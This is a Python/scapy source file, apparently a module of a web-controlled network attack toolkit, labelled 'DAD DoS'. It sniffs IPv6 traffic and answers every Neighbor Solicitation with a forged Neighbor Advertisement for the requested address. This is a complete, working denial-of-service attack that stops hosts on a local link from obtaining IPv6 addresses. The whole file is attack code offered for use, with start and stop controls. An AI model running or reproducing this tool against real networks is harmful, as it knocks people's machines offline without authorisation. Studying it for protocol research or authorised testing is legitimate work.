from scapy.all import *
from copy import copy
import sys
from multiprocessing.pool import ThreadPool, Pool
from template import Template

sys.path.insert(0,'..')
from ipv6.ipv6 import createIPv6, get_source_address, grabRawDst, grabRawSrc, getMacAddress

class IPv6Module(Template):

    def __init__(self, socketio, namespace):
        super(IPv6Module, self).__init__(socketio, namespace)
        self.modname = "DAD DoS"
        self.actions = [
            {
                "title": "Start DAD DoS",
                "action": "action"
            },
            {
                "title": "Stop DAD DoS",
                "action": "stop_sniffer"
            }
        ]

    def action(self, target=None):
        self.sniffer = IPv6Sniffer(self)
        self.socket_log('Sniffer intitialized.')
        self.sniffer.start()

    def stop_sniffer(self, msg):
        try:
            self.sniffer.stop()
            self.socket_log('Sniffer terminated.')
        except Exception, e:
            self.socket_log('Sniffer not yet intitialized.')

class IPv6Sniffer:
    pool = None
    stopped = False

    def __init__(self, mod):
        self.mod = mod

    # initialize the listener
    def start(self):
        print("sniffer intialized")
        self.stopped = False
        self.pool = ThreadPool(processes=1)
        self.pool.apply_async(self.listen)
        # self.listen()

    # start the listener
    def listen(self):
        res = sniff(lfilter=lambda (packet): IPv6 in packet,
                    prn=lambda (packet): self.callback(packet),
                    stop_filter=self.stopfilter,
                    store=0)
        return res

    # stop the listener
    def stop(self):
        print('Stopping sniffer')
        self.stopped = True
        self.pool.close()
        self.pool.join()

    def stopfilter(self, packet):
        return self.stopped

    # callback for when packets are received
    def callback(self, packet):
        if ICMPv6ND_NS in packet:
            try:
                self.DAD_DoS(packet)
            except Exception,e:
                exc_info = sys.exc_info()
                traceback.print_exception(*exc_info)
                #print e

    def DAD_DoS(self, packet, dst=get_source_address(IPv6(dst="ff02::1"))):
        tgt = packet[ICMPv6ND_NS].fields["tgt"]

        ip_packet = createIPv6()
        ip_packet.fields["nh"] = 58 #ICMPv6
        ip_packet.fields["hlim"] = 255
        ip_packet.fields["src"] = tgt
        ip_packet.fields["dst"] = "ff02::1"

        #if packet[IPv6].src != "::":
        #    packet[IPv6].fields["dst"] = packet[IPv6].src

        advertisement = ICMPv6ND_NA()
        advertisement.fields["R"] = 0
        advertisement.fields["S"] = 0
        advertisement.fields["O"] = 1
        advertisement.fields["tgt"] = tgt
        
        options = ICMPv6NDOptSrcLLAddr()
        options.fields["lladdr"] = [get_if_hwaddr(i) for i in get_if_list()][0]

        send(ip_packet/advertisement/options)
        out = "DAD_DoS: Overriding IPv6 Neighbor Solicitation: %s" % (tgt)
        self.mod.socket_log(out)
        print out
